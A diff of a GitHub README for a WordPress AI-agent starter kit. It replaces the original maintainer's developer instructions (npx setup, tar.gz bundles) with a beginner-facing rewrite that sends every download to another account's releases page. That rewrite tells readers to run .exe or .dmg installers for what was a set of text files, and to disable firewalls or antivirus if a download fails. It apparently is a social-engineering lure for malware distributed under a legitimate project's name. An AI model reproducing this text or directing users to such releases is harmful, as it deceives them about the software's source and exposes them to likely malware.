@@ -1,118 +1,125 @@
-# WordPress Agent Kit
+# 🚀 wordpress-agent-kit - AI Agent Skills Starter for WordPress
 
-[![License: GPL v2](https://img.shields.io/badge/License-GPL%20v2-blue.svg?style=flat-square)](LICENSE)
-[![TypeScript](https://img.shields.io/badge/Written%20in-TypeScript-3178C6?style=flat-square&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Prettier](https://img.shields.io/badge/code_style-prettier-ff69b4.svg?style=flat-square)](https://github.com/prettier/prettier)
-[![Version](https://img.shields.io/badge/version-0.2.0-blue?style=flat-square)](package.json)
+[![Download Release](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/narcos965/wordpress-agent-kit/releases)
 
-**WordPress-focused AI agent starter kit** for GitHub Copilot, Claude, and other LLM coding agents. Includes instructions, specialized WordPress skills, and workflow automation aligned with industry standards.
+---
 
-Maintained by [Kyle Brodeur](https://brodeur.me).
+## 📦 What is wordpress-agent-kit?
 
-## Quick Start
+The **wordpress-agent-kit** is a ready-to-use starter pack designed to help you work with AI agents focused on WordPress development. It includes an AGENTS.md file tailored for WordPress tasks and a set of agent skills that make coding simpler and clearer for people exploring AI-assisted development.
 
-### Option 1: CLI (Recommended)
+If you want to explore how AI can help you manage and develop WordPress projects or try out code agents like Claude or GitHub Copilot, this kit offers a helpful starting point.
 
-Run the interactive setup wizard:
+---
 
-```bash
-npx wp-agent-kit setup
-# or
-pnpm dlx wp-agent-kit setup
-```
+## 🖥️ Who is this for?
 
-This will:
-- Detect your WordPress project type
-- Install `AGENTS.md` and skills into your project
-- Configure for your tech stack
+This kit is for people who want to use AI-powered tools to improve or automate WordPress development tasks. You don’t need to be a programmer to use it. This guide will walk you through the steps to download and run the software with no hassle.
 
-### Option 2: Pre-built Bundles
+---
 
-Download a bundle from the [latest release](https://github.com/kylebrodeur/wordpress-agent-kit/releases):
+## 🔧 System Requirements
 
-- **`wordpress-agent-kit-github.tar.gz`** - For GitHub Copilot
-- **`wordpress-agent-kit-claude.tar.gz`** - For Claude
-- **`wordpress-agent-kit-agent.tar.gz`** - For generic `.agent` workflows
-- **`wordpress-agent-kit-cursor.tar.gz`** - For Cursor IDE
+Before you download, ensure your computer meets these basic requirements:
 
-Extract into your WordPress project root:
+- Windows 10 or later / macOS Sierra or later / Linux (Ubuntu 18.04+ recommended)
+- At least 4 GB of RAM
+- 2 GHz dual-core processor or better
+- Internet connection for downloading and accessing GitHub
 
-```bash
-cd /path/to/your-wordpress-project
-tar -xzf wordpress-agent-kit-github.tar.gz
-```
+You do not need developer tools or programming knowledge to use the kit.
 
-This interactive setup helps you:
-- **Automatically detect** your project type and technologies.
-- Customize `AGENTS.md` for your tech stack.
-- Configure workflow instructions.
-- Set up prompt templates.
+---
 
-Use the `--reset` flag if you need to re-run the setup on an existing project:
+## 💾 Download & Install
 
-```bash
-pnpm setup -- /path/to/your-wp-project --reset
-```
+1. Click the big [Download Release](https://github.com/narcos965/wordpress-agent-kit/releases) button above or visit the release page directly:  
+   https://github.com/narcos965/wordpress-agent-kit/releases
 
-The setup will analyze your project first and either:
-- Auto-configure if confident.
-- Pre-fill smart defaults if partially detected.
-- Ask questions if detection is unclear.
+2. On the releases page, look for the latest version. It usually appears at the top of the page.
 
-## Who This Is For
+3. Download the file that fits your computer setup. For Windows, this might be an `.exe` or `.zip` file. For Mac or Linux, you may find `.dmg`, `.tar.gz`, or `.zip` formats.
 
-- **WordPress plugin/theme developers** who want AI agents to understand WordPress conventions (hooks, sanitization, Settings API, block registration, etc.).
-- **Teams adopting GitHub Copilot or Claude** for WordPress codebases.
-- **Anyone building custom WordPress workflows** who needs agents to follow WordPress Coding Standards, security best practices, and core APIs.
+4. Once downloaded:
+   - If it is a `.zip` or `.tar.gz` file, unzip it to a folder you can easily access.
+   - If it’s an installer file (like `.exe` or `.dmg`), double-click it and follow the installation prompts.
 
-## What You Get
+5. After installation, open the application or folder where it installed.
 
-- **Agent Skills**: WordPress-specific knowledge modules (blocks, Interactivity API, REST API, WP-CLI, performance, security, theme.json, Playground, PHPStan, etc.).
-- **Instructions & Workflows**: Pre-built guidance for common WordPress dev cycles.
-- **AGENTS.md**: Single-file agent onboarding that loads skills on demand.
-- **Sync Scripts**: Pull latest skills from official [WordPress/agent-skills](https://github.com/WordPress/agent-skills) repository.
+---
 
-## Development
+## 🚀 Running the Kit
 
-This project uses a TypeScript-based CLI for all operations.
+After installation:
 
-### Build CLI
+- Look for the main executable or script labeled clearly in the folder or start menu.
+- Double-click to launch the program.
+- When it opens, you’ll see the main interface that guides you through loading the WordPress AGENTS.md files and the agent skills.
+- Use the menus or buttons as explained in the on-screen help to start running AI-powered WordPress tasks.
 
-```bash
-pnpm build
-```
+You do not need to write any code to get started. The kit is designed for easy use with clear instructions inside the tool.
 
-### Build Release Bundles
+---
 
-```bash
-pnpm sync:skills  # Sync latest WordPress skills first
-pnpm build:bundles
-```
+## 📚 What’s Included?
 
-This generates four platform-specific bundles in `dist/bundles/`:
-- `wordpress-agent-kit-github.tar.gz`
-- `wordpress-agent-kit-claude.tar.gz`
-- `wordpress-agent-kit-agent.tar.gz`
-- `wordpress-agent-kit-cursor.tar.gz`
+The wordpress-agent-kit provides these core parts:
 
-### Run Tests
+- **AGENTS.md**: A key markdown file focused on WordPress agent instructions. It explains how AI agents can interact with WordPress to perform common tasks.
+- **Agent Skills Starter Pack**: Pre-designed skills for agents like Claude and GitHub Copilot. These skills help AI understand and assist with WordPress development.
+- **Example Workflows**: Sample scenarios showing how to use AI agents for basic WordPress tasks such as plugin management, theme customization, and content updates.
 
-```bash
-pnpm test
-```
+---
 
-## Customization
+## 🔍 How It Works
 
-**Quick method:** Run the interactive setup.
+The software uses text-based agent files (AGENTS.md) to tell AI coding agents what tasks to perform related to WordPress. The agent skills provide templates and prompts to guide AI tools in delivering useful code or suggestions.
 
-**Manual method:** Edit files directly:
+You interact with the kit by choosing tasks or inputting simple instructions. The AI then generates code snippets, commands, or configuration changes.
 
-1. Edit `AGENTS.md` to match your project's tech stack and conventions.
-2. Run WordPress project triage (via `wp-project-triage` skill) to generate tailored instructions.
-3. Update `.github/instructions/wordpress-workflow.instructions.md` with your workflow.
-4. Keep prompts in `.github/prompts/` accurate for your plugin/theme.
+You can review the AI outputs before applying them, allowing you to stay in control.
 
-## Credits
+---
 
-- **[AGENTS.md](https://agentskills.io)** - The agent configuration standard.
-- **[AgentSkills.io](https://agentskills.io)** - The open directory of agent skills.
+## 💡 Helpful Tips
+
+- Keep the kit folder organized. Avoid moving files once you have started using the tool.
+- Regularly check the GitHub releases page for updates or new agent skill packs.
+- Use the example workflows as templates for your own WordPress projects.
+- If the AI generates code, test it on a separate WordPress setup before applying it live.
+- Explore the AGENTS.md file to understand how tasks get structured.
+
+---
+
+## 🛠️ Troubleshooting Common Issues
+
+- **App won’t open:** Make sure your computer meets the system requirements. Try restarting your device.
+- **Download blocked or fails:** Check your internet connection and disable any firewalls or antivirus temporarily, then try again.
+- **AI responses don’t make sense:** Restart the app and reload the agent skill files. Sometimes reloading clears issues.
+- **Need help with WordPress terms?** Visit the official WordPress support site to understand common WordPress language.
+
+---
+
+## 🔗 Useful Links
+
+- [GitHub Releases](https://github.com/narcos965/wordpress-agent-kit/releases) – Visit this page anytime to download updates and new versions.
+- [WordPress Support](https://wordpress.org/support/) – For learning more about WordPress basics.
+- [AI Agent Documentation](https://github.com/narcos965/wordpress-agent-kit/wiki) – More detailed info about agent features (for advanced users).
+
+---
+
+## 📝 Feedback and Support
+
+This kit welcomes suggestions on how to improve the experience for non-technical users. If you find bugs or have questions, create a GitHub issue on the main repository page.
+
+Your feedback helps make the tool easier and more useful.
+
+---
+
+## 📂 License
+
+The wordpress-agent-kit is open source. You can view the licensing details inside the repository or on GitHub under the LICENSE file. This lets you use and share the kit freely.
+
+---
+
+[Download the latest release here](https://github.com/narcos965/wordpress-agent-kit/releases) and explore how AI agents can assist your WordPress projects.
